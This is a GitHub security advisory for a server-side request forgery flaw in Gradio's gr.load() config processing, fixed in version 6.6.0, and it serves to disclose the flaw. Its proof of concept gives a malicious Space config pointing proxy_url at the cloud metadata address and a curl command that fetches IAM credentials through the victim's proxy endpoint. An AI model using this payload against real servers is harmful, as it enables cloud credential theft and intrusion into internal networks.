# [H] Gradio has SSRF via Malicious `proxy_url` Injection in `gr.load()` Config Processing

## Summary
Severity: High
Advisory: GHSA-jmh7-g254-2cq9
CVE: CVE-2026-28416
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-03-01
Source: https://github.com/advisories/GHSA-jmh7-g254-2cq9
Type: github-advisory

## Affected
- PyPI: `gradio` — affected >=0 <6.6.0

## Details
### Summary

A Server-Side Request Forgery (SSRF) vulnerability in Gradio allows an attacker to make arbitrary HTTP requests from a victim's server by hosting a malicious Gradio Space. When a victim application uses `gr.load()` to load an attacker-controlled Space, the malicious `proxy_url` from the config is trusted and added to the allowlist, enabling the attacker to access internal services, cloud metadata endpoints, and private networks through the victim's infrastructure.

### Details

The vulnerability exists in Gradio's config processing flow when loading external Spaces:

1. **Config Fetching** (`gradio/external.py:630`): `gr.load()` calls `Blocks.from_config()` which fetches and processes the remote Space's configuration.

2. **Proxy URL Trust** (`gradio/blocks.py:1231-1233`): The `proxy_url` from the untrusted config is added directly to `self.proxy_urls`:
   ```python
   if config.get("proxy_url"):
       self.proxy_urls.add(config["proxy_url"])
   ```

3. **Built-in Proxy Route** (`gradio/routes.py:1029-1031`): Every Gradio app automatically exposes a `/proxy={url_path}` endpoint:
   ```python
   @router.get("/proxy={url_path:path}", dependencies=[Depends(login_check)])
   async def reverse_proxy(url_path: str):
   ```

4. **Host-based Validation** (`gradio/routes.py:365-368`): The validation only checks if the URL's host matches any trusted `proxy_url` host:
   ```python
   is_safe_url = any(
       url.host == httpx.URL(root).host for root in self.blocks.proxy_urls
   )
   ```

An attacker can set `proxy_url` to `http://169.254.169.254/` (AWS metadata) or any internal service, and the victim's server will proxy requests to those endpoints.

### PoC

Full PoC: https://gist.github.com/logicx24/8d4c1aaa4e70f85d0d0fba06a463f2d6

**1. Attacker creates a malicious Gradio Space** that returns this config:
```python
{
    "mode": "blocks",
    "components": [...],
    "proxy_url": "http://169.254.169.254/"  # AWS metadata endpoint
}
```

**2. Victim loads the malicious Space:**
```python
import gradio as gr
demo = gr.load("attacker/malicious-space")
demo.launch(server_name="0.0.0.0", server_port=7860)
```

**3. Attacker exploits the proxy:**
```bash
# Fetch AWS credentials through victim's server
curl "http://victim:7860/gradio_api/proxy=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
```

### Impact

**Who is impacted:**
- Any Gradio application that uses `gr.load()` to load external/untrusted Spaces
- HuggingFace Spaces that compose or embed other Spaces
- Enterprise deployments where Gradio apps have access to internal networks

**Attack scenarios:**
- **Cloud credential theft**: Access AWS/GCP/Azure metadata endpoints to steal IAM credentials
- **Internal service access**: Reach databases, admin panels, and APIs on private networks
- **Network reconnaissance**: Map internal infrastructure through the victim
- **Data exfiltration**: Access sensitive internal APIs and services

## References
- https://github.com/gradio-app/gradio/security/advisories/GHSA-jmh7-g254-2cq9
- https://nvd.nist.gov/vuln/detail/CVE-2026-28416
- https://github.com/gradio-app/gradio/commit/fc7c01ea1e581ef70be98fddf003b0c91315c7cc
- https://github.com/gradio-app/gradio
- https://github.com/gradio-app/gradio/releases/tag/gradio%406.6.0
- https://github.com/pypa/advisory-database/tree/main/vulns/gradio/PYSEC-2026-66.yaml
